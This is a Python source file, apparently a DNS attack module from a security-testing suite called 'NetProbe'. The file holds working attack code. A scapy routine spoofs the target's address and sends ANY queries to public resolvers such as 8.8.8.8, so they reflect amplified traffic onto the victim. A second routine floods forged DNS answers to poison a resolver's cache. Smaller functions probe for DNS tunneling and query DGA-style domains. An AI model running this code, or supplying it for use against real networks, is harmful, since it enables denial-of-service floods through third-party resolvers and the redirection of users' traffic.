"""
NetProbe Security Suite - DNS Attacks Module
Tools: scapy (amplif/poison), dnspython (tunnel/dga)
"""
import asyncio
import hashlib
import os
import random
import shutil
from utils.raw_exec import raw_exec

MODULE_NAMES = {
    "dns_amplif": "DNS Amplification",
    "dns_tunnel": "DNS Tunneling",
    "dns_poison": "DNS Cache Poison",
    "dga_query":  "DGA Domain Queries",
}

PUBLIC_DNS = ["8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222"]

async def run_dns_module(module_id, target, intensity, duration, log_fn):
    name = MODULE_NAMES.get(module_id, module_id)
    await log_fn("MODULE", f"▶ {name}", module_id)
    runners = {
        "dns_amplif": _dns_amplification,
        "dns_tunnel": _dns_tunneling,
        "dns_poison": _dns_cache_poison,
        "dga_query":  _dga_queries,
    }
    return await runners[module_id](target, intensity, log_fn)


async def _dns_amplification(target, intensity, log_fn):
    if os.geteuid() != 0:
        await log_fn("WARN", "DNS Amplification requiere root", "dns_amplif")
        return {}, "ERROR", None

    try:
        from scapy.all import IP, UDP, DNS, DNSQR, send, conf
        conf.verb = 0
    except ImportError:
        await log_fn("WARN", "scapy no instalado: pip install scapy", "dns_amplif")
        return {}, "ERROR", None

    count = {1:10, 2:50, 3:100, 4:300, 5:500}.get(intensity, 100)
    sent  = 0

    for dns_server in PUBLIC_DNS[:2]:
        await log_fn("CMD", f"scapy: IP(src={target},dst={dns_server})/UDP(dport=53)/DNS(qtype=ANY,qname='.') x{count//2}", "dns_amplif")
        def do_send(srv=dns_server):
            nonlocal sent
            pkt = (IP(src=target, dst=srv) /
                   UDP(sport=random.randint(1024,65535), dport=53) /
                   DNS(rd=1, qd=DNSQR(qname=".", qtype="ANY")))
            send(pkt, count=count//2, verbose=False)
            sent += count//2

        await asyncio.get_event_loop().run_in_executor(None, do_send)
        await log_fn("RAW", f"DNS ANY queries → {dns_server}\nSpoofed src: {target}\nPaquetes: {count//2}\nAmplification factor estimado: ~50x", "dns_amplif")

    return {"queries_sent": sent, "amplification_factor": 50, "reflectors": PUBLIC_DNS[:2]}, "DETECTED", 60


async def _dns_tunneling(target, intensity, log_fn):
    """Test if target DNS server resolves arbitrary subdomains (tunnel indicator)."""
    try:
        import dns.resolver
    except ImportError:
        await log_fn("WARN", "dnspython no instalado: pip install dnspython", "dns_tunnel")
        return {}, "ERROR", None

    resolver = dns.resolver.Resolver()
    resolver.nameservers = [target]
    resolver.timeout  = 3
    resolver.lifetime = 5

    # Test 1: Does the server resolve external domains?
    test_domains = ["google.com", "github.com", "cloudflare.com"]
    resolved_external = []
    for domain in test_domains:
        await log_fn("CMD", f"dig @{target} {domain} A", "dns_tunnel")
        try:
            ans = resolver.resolve(domain, "A")
            ips = [str(r) for r in ans]
            await log_fn("RAW", f"Query: {domain}\nAnswer: {ips}\n", "dns_tunnel")
            resolved_external.append(domain)
        except Exception as e:
            await log_fn("RAW", f"Query: {domain}\nError: {e}\n", "dns_tunnel")

    # Test 2: Try hex-encoded subdomain (tunnel exfil simulation)
    test_data = b"netprobe-tunnel-test"
    subdomain = test_data.hex() + ".exfil.test.local"
    await log_fn("CMD", f"dig @{target} {subdomain} TXT", "dns_tunnel")
    tunnel_resolved = False
    try:
        resolver.resolve(subdomain, "A")
        tunnel_resolved = True
        await log_fn("WARN", "🚨 DNS resuelve subdominio arbitrario — tunneling posible", "dns_tunnel")
    except dns.resolver.NXDOMAIN:
        await log_fn("RAW", f"NXDOMAIN para {subdomain}\n(esperado si DNS está bien configurado)", "dns_tunnel")
    except Exception as e:
        await log_fn("RAW", f"Error: {e}", "dns_tunnel")

    if tunnel_resolved or len(resolved_external) == len(test_domains):
        return {"tunnel_possible": tunnel_resolved, "external_resolution": resolved_external}, "PARTIAL", 35
    return {"tunnel_possible": False, "external_resolution": resolved_external}, "BLOCKED", 100


async def _dns_cache_poison(target, intensity, log_fn):
    if os.geteuid() != 0:
        await log_fn("WARN", "DNS Cache Poison requiere root", "dns_poison")
        return {}, "ERROR", None

    try:
        from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, conf
        conf.verb = 0
    except ImportError:
        await log_fn("WARN", "scapy no instalado: pip install scapy", "dns_poison")
        return {}, "ERROR", None

    count   = {1:10, 2:50, 3:100, 4:300, 5:500}.get(intensity, 50)
    fake_ip = "6.6.6.6"
    domain  = "victim.test.local"

    await log_fn("CMD", f"scapy: IP(dst={target})/UDP(dport=53)/DNS(id=rand,qr=1,aa=1,qd={domain},an={fake_ip}) x{count}", "dns_poison")

    def do_send():
        for _ in range(count):
            txid = random.randint(0, 65535)
            pkt  = (IP(dst=target) / UDP(dport=53) /
                    DNS(id=txid, qr=1, aa=1, rd=1, ra=1,
                        qd=DNSQR(qname=domain),
                        an=DNSRR(rrname=domain, ttl=86400, rdata=fake_ip)))
            send(pkt, verbose=False)

    await asyncio.get_event_loop().run_in_executor(None, do_send)
    await log_fn("RAW", f"Cache poison attempt completado\nPackets: {count}\nDomain forjado: {domain}\nFake IP: {fake_ip}\nTXIDs: aleatorios (0-65535)\nDestino DNS: {target}", "dns_poison")

    # Verify if poison worked using dig
    cmd_verify = f"dig @{target} {domain} A +short"
    out, _, _ = await raw_exec(cmd_verify, log_fn, "dns_poison", timeout=5)
    if fake_ip in out:
        await log_fn("WARN", f"🚨 Cache poison exitoso: {domain} → {fake_ip}", "dns_poison")
        return {"poison_successful": True, "fake_ip": fake_ip, "packets": count}, "PASSED", 0

    return {"poison_packets_sent": count, "fake_ip": fake_ip, "verified": False}, "DETECTED", 60


async def _dga_queries(target, intensity, log_fn):
    try:
        import dns.resolver
    except ImportError:
        await log_fn("WARN", "dnspython no instalado: pip install dnspython", "dga_query")
        return {}, "ERROR", None

    # Check if dig is available for real output
    use_dig = bool(shutil.which("dig"))

    seed = 20240101
    count = {1:10, 2:20, 3:30, 4:40, 5:50}.get(intensity, 20)
    domains = []
    for i in range(count):
        h   = hashlib.md5(f"{seed}{i}".encode()).hexdigest()[:12]
        tld = random.choice([".com", ".net", ".org", ".info", ".biz"])
        domains.append(h + tld)

    await log_fn("CMD", f"dig @{target} <DGA_domain> A  (x{count} domains)", "dga_query")
    resolved, blocked = 0, 0

    for d in domains:
        if use_dig:
            cmd = f"dig @{target} {d} A +short +time=2 +tries=1"
            out, _, rc = await raw_exec(cmd, log_fn, "dga_query", timeout=5)
            if rc == 0 and out.strip() and out.strip() != "":
                resolved += 1
            else:
                blocked += 1
        else:
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [target]
            resolver.timeout  = 2
            resolver.lifetime = 3
            try:
                resolver.resolve(d, "A")
                resolved += 1
                await log_fn("RAW", f"{d} → RESOLVED ⚠️", "dga_query")
            except Exception:
                blocked += 1
                await log_fn("RAW", f"{d} → NXDOMAIN ✓", "dga_query")

    await log_fn("RAW", f"\nResumen DGA:\nTotal queries: {count}\nResueltos: {resolved} ⚠️\nBloqueados: {blocked} ✓", "dga_query")

    if resolved > count * 0.3:
        await log_fn("WARN", f"⚠️ DNS resuelve {resolved}/{count} dominios DGA — sin filtrado", "dga_query")
        return {"queries_total": count, "resolved": resolved, "blocked": blocked}, "PASSED", 0
    if resolved > 0:
        return {"queries_total": count, "resolved": resolved, "blocked": blocked}, "PARTIAL", 35
    return {"queries_total": count, "resolved": 0, "blocked": blocked}, "BLOCKED", 100
